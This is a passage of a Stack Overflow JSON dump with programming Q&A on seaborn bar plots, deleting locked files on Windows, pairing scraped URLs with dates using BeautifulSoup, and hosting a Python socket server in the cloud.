"https://www.gravatar.com/avatar/6ca3e35daa9949f17b342d149d07c1cc?s=128&d=identicon&r=PG&f=1", "display_name": "Silviu Tofan", "link": "https://stackoverflow.com/users/5784297/silviu-tofan"}, "edited": false, "score": 0, "creation_date": 1465658717, "post_id": 37175276, "comment_id": 62999428, "body": "No worries. You should be able to accept the answer, this will both give you more rep and mark the issue as closed, otherwise the question still appears as unanswered."}, {"owner": {"reputation": 339, "user_id": 5784297, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/6ca3e35daa9949f17b342d149d07c1cc?s=128&d=identicon&r=PG&f=1", "display_name": "Silviu Tofan", "link": "https://stackoverflow.com/users/5784297/silviu-tofan"}, "edited": false, "score": 0, "creation_date": 1465658987, "post_id": 37175276, "comment_id": 62999508, "body": "Just noticed that tick under voting, thanks for that!"}, {"owner": {"reputation": 324, "user_id": 853561, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/800a8fd5f374989ef14a7c8814d919a6?s=128&d=identicon&r=PG", "display_name": "magnum87", "link": "https://stackoverflow.com/users/853561/magnum87"}, "edited": false, "score": 0, "creation_date": 1613910020, "post_id": 37175276, "comment_id": 117216370, "body": "What I cannot understand is why the seaborn doc says  <code>Input data can be passed in a variety of formats, including: [...] A \u201cwide-form\u201d DataFrame, such that each numeric column will be plotted.</code>, which apparently is not true, as input data CANNOT be passed in wide-form dataframe, instead it should be previously converted in long-form. Am I missing something?"}], "tags": [], "owner": {"reputation": 34745, "user_id": 1494637, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/a50559f059e0621b4f543bcda9aad0a6?s=128&d=identicon&r=PG&f=1", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1494637/stefan"}, "is_accepted": true, "score": 6, "last_activity_date": 1463013070, "last_edit_date": 1463013070, "creation_date": 1463012376, "answer_id": 37175276, "question_id": 37174715, "link": "https://stackoverflow.com/questions/37174715/using-seaborn-barplot-to-plot-wide-form-dataframes/37175276#37175276", "title": "Using seaborn barplot to plot wide-form dataframes", "body": "<p>The <code>seaborn.barplot</code> docs say:</p>\n\n<blockquote>\n  <p>A bar plot represents an estimate of central tendency for a numeric variable with the height of each rectangle and provides some indication of the uncertainty around that estimate using error bars.</p>\n</blockquote>\n\n<p>In other words, the purpose is to represent multiple values for a one variable with a single bar that represents the <code>mean</code>, and error bars for <code>std</code>. You are looking to represent individual values with bars as the <code>pandas.plot.bar()</code> does.</p>\n\n<p>Having said this, you can tweak your <code>DataFrame</code> as below to match the <code>seaborn</code> interface. Starting with a <code>DataFrame</code> similar to yours:</p>\n\n<pre><code>df = pd.DataFrame(np.random.randint(low=0, high=10, size=(10, 3)), columns=list('ABC'))\n\n   A  B  C\n0  7  6  4\n1  3  5  9\n2  3  0  5\n3  0  1  3\n4  9  7  7\n</code></pre>\n\n<p>Use <code>.stack()</code> and <code>.reset_index()</code> to create two columns that uniquely identify each value in <code>y</code>:</p>\n\n<pre><code>df = df.stack().reset_index()\ndf.columns = ['x', 'hue', 'y']\n</code></pre>\n\n<p>which yields:</p>\n\n<pre><code>   x hue  y\n0  0   A  6\n1  0   B  1\n2  0   C  2\n3  1   A  5\n4  1   B  7\n</code></pre>\n\n<p>then plot:</p>\n\n<pre><code>sns.barplot(y='y', x='x', hue='hue', data=df)\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/UajYH.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/UajYH.png\" alt=\"enter image description here\"></a></p>\n"}], "owner": {"reputation": 339, "user_id": 5784297, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/6ca3e35daa9949f17b342d149d07c1cc?s=128&d=identicon&r=PG&f=1", "display_name": "Silviu Tofan", "link": "https://stackoverflow.com/users/5784297/silviu-tofan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4173, "favorite_count": 1, "accepted_answer_id": 37175276, "answer_count": 1, "score": 5, "last_activity_date": 1466519120, "creation_date": 1463008123, "last_edit_date": 1466519120, "question_id": 37174715, "link": "https://stackoverflow.com/questions/37174715/using-seaborn-barplot-to-plot-wide-form-dataframes", "title": "Using seaborn barplot to plot wide-form dataframes", "body": "<p>I'm trying to produce a bar chart with all the observations in my <code>DataFrame</code>, which looks like this: <a href=\"http://i.stack.imgur.com/F8DeC.png\" rel=\"nofollow\">Dataframe</a> (rows = years, columns = objects, values = violations of object in year)</p>\n\n<p>I'm getting the right type of graph when using the default pandas <code>plot</code>:</p>\n\n<pre><code>cluster_yearly_results_df.plot.bar()\n</code></pre>\n\n<p><a href=\"http://i.stack.imgur.com/gKQy0.png\" rel=\"nofollow\">Correct Bar Plot</a></p>\n\n<p>However, I would like to use seaborn, and I am having trouble inputting wide-form dataframes, using:</p>\n\n<pre><code>sns.barplot(data=cluster_yearly_results_df)\n</code></pre>\n\n<p>Can I use seaborn for what I want to do?</p>\n"}, {"tags": ["python", "file", "operating-system"], "comments": [{"owner": {"reputation": 29, "user_id": 2127678, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b083bd2aa71acad11880e3a3de4707e8?s=128&d=identicon&r=PG", "display_name": "user2127678", "link": "https://stackoverflow.com/users/2127678/user2127678"}, "edited": false, "score": 0, "creation_date": 1463007926, "post_id": 37174653, "comment_id": 61883975, "body": "This looks like it may answer your question: <a href=\"http://stackoverflow.com/questions/13766513/how-to-do-force-remove-in-python-like-rm-rf-on-linux\" title=\"how to do force remove in python like rm rf on linux\">stackoverflow.com/questions/13766513/&hellip;</a>"}, {"owner": {"reputation": 13543, "user_id": 1107049, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/8f94b3bb695b3bbd83be44eb151aa63e?s=128&d=identicon&r=PG", "display_name": "alphanumeric", "link": "https://stackoverflow.com/users/1107049/alphanumeric"}, "reply_to_user": {"reputation": 29, "user_id": 2127678, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b083bd2aa71acad11880e3a3de4707e8?s=128&d=identicon&r=PG", "display_name": "user2127678", "link": "https://stackoverflow.com/users/2127678/user2127678"}, "edited": false, "score": 0, "creation_date": 1463008371, "post_id": 37174653, "comment_id": 61884099, "body": "I have tried the solution from the the post to which you specified a link. None of them works for me."}, {"owner": {"reputation": 2046, "user_id": 1357527, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/e689f1fae96cb781cb487a0bc045b5be?s=128&d=identicon&r=PG", "display_name": "Natecat", "link": "https://stackoverflow.com/users/1357527/natecat"}, "edited": false, "score": 0, "creation_date": 1463009520, "post_id": 37174653, "comment_id": 61884416, "body": "Kill the process using the file."}, {"owner": {"reputation": 2631, "user_id": 1202834, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/518724a126e37579e4d114eddb0bc5c9?s=128&d=identicon&r=PG", "display_name": "aquil.abdullah", "link": "https://stackoverflow.com/users/1202834/aquil-abdullah"}, "edited": false, "score": 0, "creation_date": 1463011910, "post_id": 37174653, "comment_id": 61885063, "body": "The answer to this question may vary depending on the operating system that you are using. Is your goal to delete a single file that is causing you a problem or is it to write code that will delete files that have an open file handle? If you just want to delete the file once then you should grep the process list for processes using the file and then perform a kill -9 (nucelar) on those processes. If you are trying to write code that does this the answer depends on your OS."}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463015150, "post_id": 37174653, "comment_id": 61885801, "body": "I presume you are using windows?"}, {"owner": {"reputation": 13543, "user_id": 1107049, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/8f94b3bb695b3bbd83be44eb151aa63e?s=128&d=identicon&r=PG", "display_name": "alphanumeric", "link": "https://stackoverflow.com/users/1107049/alphanumeric"}, "edited": false, "score": 0, "creation_date": 1463018048, "post_id": 37174653, "comment_id": 61886491, "body": "It is running on Windows. Need to save the process that uses the file."}], "owner": {"reputation": 13543, "user_id": 1107049, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/8f94b3bb695b3bbd83be44eb151aa63e?s=128&d=identicon&r=PG", "display_name": "alphanumeric", "link": "https://stackoverflow.com/users/1107049/alphanumeric"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1848, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1463015064, "creation_date": 1463007636, "last_edit_date": 1463015064, "question_id": 37174653, "link": "https://stackoverflow.com/questions/37174653/how-to-remove-the-file-or-folder-even-if-it-is-used-by-another-process", "title": "How to remove the file or folder even if it is used by another process", "body": "<p>Is there a way to force-delete a file or a folder even if it is used by another process? I am getting on Windows: </p>\n\n<p><code>[Error 32] The process cannot access the file because it is being used by another process.</code>  </p>\n"}, {"tags": ["python", "web-scraping", "beautifulsoup"], "comments": [{"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463007637, "post_id": 37174636, "comment_id": 61883887, "body": "Can you share the actual link? Are there the same number of hrefs as date if you take every second href?"}, {"owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "edited": false, "score": 0, "creation_date": 1463008015, "post_id": 37174636, "comment_id": 61883999, "body": "Where is the closing <code>&lt;&#47;a&gt;</code>?"}, {"owner": {"reputation": 573, "user_id": 5369777, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/MEZym.jpg?s=128&g=1", "display_name": "Derek_P", "link": "https://stackoverflow.com/users/5369777/derek-p"}, "edited": false, "score": 0, "creation_date": 1463008282, "post_id": 37174636, "comment_id": 61884073, "body": "added closing &lt;/a&gt; the first href is for an image. Sure, <a href=\"http://oilprice.com/Latest-Energy-News/World-News\" rel=\"nofollow noreferrer\">oilprice.com/Latest-Energy-News/World-News</a>"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463008560, "post_id": 37174636, "comment_id": 61884162, "body": "Isn&#39;t each date associated with each link/story?"}, {"owner": {"reputation": 573, "user_id": 5369777, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/MEZym.jpg?s=128&g=1", "display_name": "Derek_P", "link": "https://stackoverflow.com/users/5369777/derek-p"}, "edited": false, "score": 0, "creation_date": 1463008818, "post_id": 37174636, "comment_id": 61884220, "body": "Certainly, in hindsight it would probably be better to scrape the outer div of both for the url and date, instead of scraping for every url."}], "answers": [{"tags": [], "owner": {"reputation": 6434, "user_id": 4443226, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/C3vUB.png?s=128&g=1", "display_name": "Nevermore", "link": "https://stackoverflow.com/users/4443226/nevermore"}, "is_accepted": false, "score": -1, "last_activity_date": 1463012440, "last_edit_date": 1495540357, "creation_date": 1463008546, "answer_id": 37174775, "question_id": 37174636, "link": "https://stackoverflow.com/questions/37174636/python-and-beautifulsoup-scraping-two-values-url-and-date-and-having-the-retu/37174775#37174775", "title": "Python and beautifulSoup: scraping two values - url and date and having the return results paired", "body": "<p>You can make the <em>dates</em> and <em>urls</em> into lists, and then <strong>zip</strong> them up, like so:</p>\n\n<pre><code>dates = []\nurls = []\nfor p in table.find_all('p', {'class':'categoryArticle__meta'}):\n    date = p.get_text()\n    dates.add(date)\nfor a in table.find_all('a', href=True)[::2][:-5]:\n    headline = a['href'] # should this be called headline?\n    urls.add(headline)\neasy_access = zip(dates, urls)\n</code></pre>\n\n<p>See these for zip help: </p>\n\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/2407398/python-merge-items-of-two-lists-into-a-list-of-tuples\">How to merge lists into a list of tuples in Python?</a></li>\n<li><a href=\"https://docs.python.org/3.3/library/functions.html#zip\" rel=\"nofollow noreferrer\">https://docs.python.org/3.3/library/functions.html#zip</a></li>\n</ul>\n\n<p>Zip turns the two lists into a list of tuples, so the output might look something like this:</p>\n\n<pre><code>easy_access = [('1/2/12', 'http://somewhere.com'), \n               ('2/2/12', 'http://somewhereelse.com'), \n               ('3/2/12', 'http://nowhere.com'), \n               ('4/2/12', 'http://here.com')]\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 900, "user_id": 1611124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c88b203dcd9098fc803a9cccde56250?s=128&d=identicon&r=PG", "display_name": "Jayson", "link": "https://stackoverflow.com/users/1611124/jayson"}, "is_accepted": false, "score": -1, "last_activity_date": 1463008923, "creation_date": 1463008923, "answer_id": 37174820, "question_id": 37174636, "link": "https://stackoverflow.com/questions/37174636/python-and-beautifulsoup-scraping-two-values-url-and-date-and-having-the-retu/37174820#37174820", "title": "Python and beautifulSoup: scraping two values - url and date and having the return results paired", "body": "<p>I think if you're trying to use one expression to match on to get both the value in href and date, it will be pretty difficult (i.e. I have no idea how to do that). However, if you use xpath to navigate to the parts you want and store them, you can easily pick out what you need. Based on the code you provided, I'd recommend something like this:</p>\n\n<pre><code>from lxml import html\nimport requests\n\nwebpage = requests.get('www.myexampleurl.com')\ntree = html.fromstring(webpage.content)\n\ncurrentHRef = tree xpath('//div//a/')[0].get(\"href\")\ncurrentDate = tree.xpath('//div//p/text()')[0]\n\ndateTarget = (currentHRef, currentDate)\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 573, "user_id": 5369777, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/MEZym.jpg?s=128&g=1", "display_name": "Derek_P", "link": "https://stackoverflow.com/users/5369777/derek-p"}, "edited": false, "score": 0, "creation_date": 1463009281, "post_id": 37174825, "comment_id": 61884360, "body": "are select and select_one request functions??"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 573, "user_id": 5369777, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/MEZym.jpg?s=128&g=1", "display_name": "Derek_P", "link": "https://stackoverflow.com/users/5369777/derek-p"}, "edited": false, "score": 0, "creation_date": 1463009356, "post_id": 37174825, "comment_id": 61884377, "body": "@citramaillo, they are bs4 methods that use css selectors, I will add how to do it using just findall etc.."}, {"owner": {"reputation": 1604, "user_id": 5991423, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/beK29.jpg?s=128&g=1", "display_name": "Aaron3468", "link": "https://stackoverflow.com/users/5991423/aaron3468"}, "edited": false, "score": 0, "creation_date": 1463012925, "post_id": 37174825, "comment_id": 61885312, "body": "Another option is to pair the values using a dictionary if one of the values is guaranteed to be unique. <code>namedtuple</code> is a bit better to use than a regular tuple in most cases because it is easier to access without introducing bugs. Building a simple storage class is also a good solution if you need to extend functionality; just store a small piece of the beautifulSoup object, and include methods to retrieve pertinent values. I&#39;ve been working on something that may be relevant on my <a href=\"https://github.com/Aarowaim/RingAnime\" rel=\"nofollow noreferrer\">github</a>"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 1604, "user_id": 5991423, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/beK29.jpg?s=128&g=1", "display_name": "Aaron3468", "link": "https://stackoverflow.com/users/5991423/aaron3468"}, "edited": false, "score": 1, "creation_date": 1463013093, "post_id": 37174825, "comment_id": 61885351, "body": "@Aaron3468, it is safer to avoid  a dict for that very reason, the dates are definitely not unique and accessing by url would be a arduous. Most likey the OP will be using or storing each date/href pair so a list of tuples is probably as good as any approach in this specific case"}], "tags": [], "owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "is_accepted": true, "score": 2, "last_activity_date": 1463009636, "last_edit_date": 1463009636, "creation_date": 1463008963, "answer_id": 37174825, "question_id": 37174636, "link": "https://stackoverflow.com/questions/37174636/python-and-beautifulsoup-scraping-two-values-url-and-date-and-having-the-retu/37174825#37174825", "title": "Python and beautifulSoup: scraping two values - url and date and having the return results paired", "body": "<p>If you scrape the divs with <code>categoryArticle__content</code> you can pull the links and the associated dates:</p>\n\n<pre><code>import  requests\nfrom bs4 import BeautifulSoup\nsoup = BeautifulSoup(requests.get(\"http://oilprice.com/Latest-Energy-News/World-News\").content)\nmain_div = soup.select_one(\"div.tableGrid__column.tableGrid__column--articleContent.category\")\n\ndivs = main_div.select('div.categoryArticle__content')\n\nprint([(d.select_one(\"p.categoryArticle__meta\").text, d.a[\"href\"]) for d in divs])\n</code></pre>\n\n<p>The text also includes more than just the date so you will want to split on a pipe char:</p>\n\n<pre><code> [(d.select_one(\"p.categoryArticle__meta\").text.split(\"|\")[0].strip(), d.a[\"href\"]) for d in divs]\n</code></pre>\n\n<p>Which gives you:</p>\n\n<pre><code>[(u'May 11, 2016 at 17:21', 'http://oilprice.com/Latest-Energy-News/World-News/Oil-Hits-6-Month-High-on-Crude-Inventory-Draw.html'), (u'May 11, 2016 at 16:56', 'http://oilprice.com/Latest-Energy-News/World-News/Nigerian-President-Lashes-Out-At-UK-Over-Stolen-Assets.html'), (u'May 11, 2016 at 15:41', 'http://oilprice.com/Latest-Energy-News/World-News/Germany-Ups-Gazprom-Imports-by-19-percent-in-Q1.html'), (u'May 11, 2016 at 15:39', 'http://oilprice.com/Latest-Energy-News/World-News/Solar-Hits-Millionth-Installation-In-The-US-Faster-Growth-Ahead.html'), (u'May 11, 2016 at 14:14', 'http://oilprice.com/Latest-Energy-News/World-News/OPEC-Production-Up-140000-Bpd-in-April.html'), (u'May 11, 2016 at 14:03', 'http://oilprice.com/Latest-Energy-News/World-News/Tullow-Ghana-Oil-Production-Down-by-More-Than-50.html'), (u'May 11, 2016 at 13:47', 'http://oilprice.com/Latest-Energy-News/World-News/Tesla-To-Complete-Model-3-Design-By-End-June.html'), (u'May 11, 2016 at 12:30', 'http://oilprice.com/Latest-Energy-News/World-News/Iraqi-Kurds-Boost-Oil-Exports-to-Turkey.html'), (u'May 11, 2016 at 11:57', 'http://oilprice.com/Latest-Energy-News/World-News/Security-Services-Raid-Headquarters-of-Ukraines-Largest-Gas-Company.html'), (u'May 11, 2016 at 10:59', 'http://oilprice.com/Latest-Energy-News/World-News/Oil-Up-3-AS-EIA-Reports-34M-Barrel-Crude-Inventory-Drop.html')]\n</code></pre>\n\n<p>It is always better to associate values from the parent tag if possible, pulling all anchors and slicing is not a very robust approach.</p>\n\n<p><code>select</code> and <code>select_one</code> use  <a href=\"https://www.crummy.com/software/BeautifulSoup/bs4/doc/#css-selectors\" rel=\"nofollow\">css-selectors</a>, the equivalent code using find and find_all would be: </p>\n\n<pre><code>import requests\nfrom bs4 import BeautifulSoup\n\nsoup = BeautifulSoup(requests.get(\"http://oilprice.com/Latest-Energy-News/World-News\").content)\nmain_div = soup.find(\"div\", class_=\"tableGrid__column tableGrid__column--articleContent category\")\ndivs = main_div.find_all(\"div\",\"categoryArticle__content\")\n\nprint([(d.find(\"p\", {\"class\": \"categoryArticle__meta\"}).text.split(\"|\")[0].strip(), d.a[\"href\"]) for d in divs])\n</code></pre>\n\n<p><code>class_=..</code> lets you <a href=\"https://www.crummy.com/software/BeautifulSoup/bs4/doc/#searching-by-css-class\" rel=\"nofollow\">search-by-css-class</a></p>\n\n<p>Also in this case <code>categoryArticle__content</code> only appears in the main div so you could search initially for those divs in place of first selecting the main div.</p>\n\n<pre><code>soup = BeautifulSoup(requests.get(\"http://oilprice.com/Latest-Energy-News/World-News\").content)\n\ndivs = soup.find_all(\"div\",\"categoryArticle__content\")\nprint([(d.find(\"p\", {\"class\": \"categoryArticle__meta\"}).text.split(\"|\")[0].strip(), d.a[\"href\"]) for d in divs])\n</code></pre>\n"}], "owner": {"reputation": 573, "user_id": 5369777, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/MEZym.jpg?s=128&g=1", "display_name": "Derek_P", "link": "https://stackoverflow.com/users/5369777/derek-p"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 950, "favorite_count": 1, "accepted_answer_id": 37174825, "answer_count": 3, "score": 1, "last_activity_date": 1463012440, "creation_date": 1463007541, "last_edit_date": 1463008262, "question_id": 37174636, "link": "https://stackoverflow.com/questions/37174636/python-and-beautifulsoup-scraping-two-values-url-and-date-and-having-the-retu", "title": "Python and beautifulSoup: scraping two values - url and date and having the return results paired", "body": "<p>I have a working code that scrapes 'a href' tags for the urls and I can get \nthe date info from the nested 'p' tags. </p>\n\n<pre><code>&lt;div class='blah'&gt;\n    &lt;a href='target_url'&gt;&lt;/a&gt;\n    &lt;p class='date'&gt;Today's date&lt;/p&gt; \n</code></pre>\n\n<p>right now it the my code looks like...</p>\n\n<pre><code>for p in table.find_all('p', {'class':'categoryArticle__meta'}):\n    date = p.get_text()\nfor a in table.find_all('a', href=True)[::2][:-5]:\n    headline = a['href']\n</code></pre>\n\n<p>I'm skipping every other href but I need every date.</p>\n\n<p>How would I go about joining the search parameters to give me the returned info, paired i.e. - 'target_url', 'Today's date' ? </p>\n"}, {"tags": ["python", "server", "cloud", "hosting", "python-requests"], "comments": [{"owner": {"reputation": 379, "user_id": 5712767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/356a38b9c8792737020099a74ff52ee8?s=128&d=identicon&r=PG&f=1", "display_name": "WreckeR", "link": "https://stackoverflow.com/users/5712767/wrecker"}, "edited": false, "score": 1, "creation_date": 1463009134, "post_id": 37174563, "comment_id": 61884308, "body": "Not very clear what you want to do? do you want to run this script somewhere and then post data to it from a different machine? And what is <code>data</code>?"}, {"owner": {"reputation": 361, "user_id": 6023103, "user_type": "registered", "accept_rate": 70, "profile_image": "https://lh6.googleusercontent.com/-NWqukzSvW-g/AAAAAAAAAAI/AAAAAAAABIQ/m9rOktdr_W4/photo.jpg?sz=128", "display_name": "Jason Owens", "link": "https://stackoverflow.com/users/6023103/jason-owens"}, "reply_to_user": {"reputation": 379, "user_id": 5712767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/356a38b9c8792737020099a74ff52ee8?s=128&d=identicon&r=PG&f=1", "display_name": "WreckeR", "link": "https://stackoverflow.com/users/5712767/wrecker"}, "edited": false, "score": 0, "creation_date": 1463010047, "post_id": 37174563, "comment_id": 61884565, "body": "I edited a bit better.  Basically, i have clients that uses sockets to connect to the server.  They are sending simple string data via socket connect.  So I want to host the server in the cloud of at my house."}, {"owner": {"reputation": 379, "user_id": 5712767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/356a38b9c8792737020099a74ff52ee8?s=128&d=identicon&r=PG&f=1", "display_name": "WreckeR", "link": "https://stackoverflow.com/users/5712767/wrecker"}, "edited": false, "score": 1, "creation_date": 1463016388, "post_id": 37174563, "comment_id": 61886039, "body": "Do you still want your script to listen on a socket on the cloud server and client to POST data to it? Also unless its a specific requirement for you to use low-level sockets, I would recommend you use simple like <code>bottle</code> to run a simple app that can receive an HTTP Post."}, {"owner": {"reputation": 361, "user_id": 6023103, "user_type": "registered", "accept_rate": 70, "profile_image": "https://lh6.googleusercontent.com/-NWqukzSvW-g/AAAAAAAAAAI/AAAAAAAABIQ/m9rOktdr_W4/photo.jpg?sz=128", "display_name": "Jason Owens", "link": "https://stackoverflow.com/users/6023103/jason-owens"}, "reply_to_user": {"reputation": 379, "user_id": 5712767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/356a38b9c8792737020099a74ff52ee8?s=128&d=identicon&r=PG&f=1", "display_name": "WreckeR", "link": "https://stackoverflow.com/users/5712767/wrecker"}, "edited": false, "score": 0, "creation_date": 1463017974, "post_id": 37174563, "comment_id": 61886471, "body": "I&#39;ve heard of bottle recently and will dig more into it.  I&#39;d prefer for it to be in the cloud, available 24/7, it really doesn&#39;t matter to me as far as lower level since no important data is being passed, the client is merely checking into the server."}], "answers": [{"comments": [{"owner": {"reputation": 361, "user_id": 6023103, "user_type": "registered", "accept_rate": 70, "profile_image": "https://lh6.googleusercontent.com/-NWqukzSvW-g/AAAAAAAAAAI/AAAAAAAABIQ/m9rOktdr_W4/photo.jpg?sz=128", "display_name": "Jason Owens", "link": "https://stackoverflow.com/users/6023103/jason-owens"}, "edited": false, "score": 0, "creation_date": 1463018011, "post_id": 37175079, "comment_id": 61886481, "body": "That&#39;s good to know :)  I&#39;m definitely going to look into it."}], "tags": [], "owner": {"reputation": 36, "user_id": 6322863, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JIQiu.png?s=128&g=1", "display_name": "alexmead", "link": "https://stackoverflow.com/users/6322863/alexmead"}, "is_accepted": true, "score": 1, "last_activity_date": 1463010830, "creation_date": 1463010830, "answer_id": 37175079, "question_id": 37174563, "link": "https://stackoverflow.com/questions/37174563/how-can-i-host-a-python-server-script-on-a-cloud-hosted-server-google-amazon/37175079#37175079", "title": "How can I host a python server script, on a cloud hosted server (Google, Amazon, Azure...)?", "body": "<p>Running a python script listening to external ports can be done on Amazon EC2.  </p>\n\n<p>1) Create an EC2 Instance using the Management Console at <a href=\"http://aws.amazon.com/\" rel=\"nofollow\">Amazon Web Services</a>. </p>\n\n<p>2) Edit the Security Group associated with your instance so it opens the port number you want your python script to be listening to.</p>\n\n<p>3) Upload and run your script on the EC2 instance. Be sure the port number that your script is listening on is the same as the one you opened in the Security Group.  </p>\n\n<p>If you SSH into your EC2 instance, you may want to run the python script in a \"background process\" using something like <a href=\"https://wiki.archlinux.org/index.php/tmux\" rel=\"nofollow\">TMUX</a>. Else when you terminate the SSH connection your python script will stop running.</p>\n"}], "owner": {"reputation": 361, "user_id": 6023103, "user_type": "registered", "accept_rate": 70, "profile_image": "https://lh6.googleusercontent.com/-NWqukzSvW-g/AAAAAAAAAAI/AAAAAAAABIQ/m9rOktdr_W4/photo.jpg?sz=128", "display_name": "Jason Owens", "link": "https://stackoverflow.com/users/6023103/jason-owens"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1443, "favorite_count": 0, "accepted_answer_id": 37175079, "answer_count": 1, "score": 0, "last_activity_date": 1463010830, "creation_date": 1463007157, "last_edit_date": 1463009958, "question_id": 37174563, "link": "https://stackoverflow.com/questions/37174563/how-can-i-host-a-python-server-script-on-a-cloud-hosted-server-google-amazon", "title": "How can I host a python server script, on a cloud hosted server (Google, Amazon, Azure...)?", "body": "<p>let me start by answering the obvious.  Why would I want to do this?  Actually, I don't.  I made the following program below, but it's designed to run on a remote server.  I'm basically using the socket library, but I want to host it on another machine, preferbly a google, amazon, azure, etc.  But, as I knew before I tried, this was slightly not possible.  Google app engine gave me an error, like \"access denied to socket blah blah blah\".  </p>\n\n<p>I feel I'm left with 2 options:</p>\n\n<p>I can continue to run this code on my own servers, if I can figure out how to host this server script on a hosted cloud base server, or I could take the code, every bit that doesn't contain the server portion, and make it get the \"data\" from the clients, via POST requests.  </p>\n\n<p>the data is what's sent from the client...</p>\n\n<pre><code>bap = {}\nwhile 1:\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    server_address = (\"localhost\", 8081)\n    #print 'starting up on %s port %s' % server_address\n    server.bind(server_address)\n    server.listen(5)\n    connection, client_address = server.accept()\n    #print 'connection from', connection.getpeername()\n    server.close()\n    data = connection.recv(4096)\n\n    if data in bap:\n        print data + \" is checking in!!!\"\n        for k, v in bap.iteritems():\n            if k == data:\n                bap[k] = 10\n                print bap\n                c = open('check.json', \"w\")\n                wiz = json.dumps(bap)\n                c.write(wiz)\n                c.close()\n            else:\n                bap[k] -= 1\n                if bap[k] &lt; 0:\n                    print k + \" is Offline!!!\"\n                    mail()\n                    c = open('log.txt', \"a\")\n                    wiz = json.dumps(bap)\n                    time1 = datetime.datetime.now().strftime(\"%m/%d/%y %H:%M \")\n                    c.write(k + \" is offline!!! \"+ time1 + \"\\n\")\n                    c.close()\n                else:\n                    print bap\n    else:\n        bap[data] = 10\n        print data + \" was added!!!\"\n</code></pre>\n"}, {"tags": ["python", "numpy", "pandas", "machine-learning", "statsmodels"], "answers": [{"comments": [{"owner": {"reputation": 15962, "user_id": 7214344, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/09fedcad60ad0dba2834ffffdd52f686?s=128&d=identicon&r=PG&f=1", "display_name": "Miriam Farber", "link": "https://stackoverflow.com/users/7214344/miriam-farber"}, "edited": false, "score": 1, "creation_date": 1500301802, "post_id": 37175906, "comment_id": 77262803, "body": "Are you familiar with 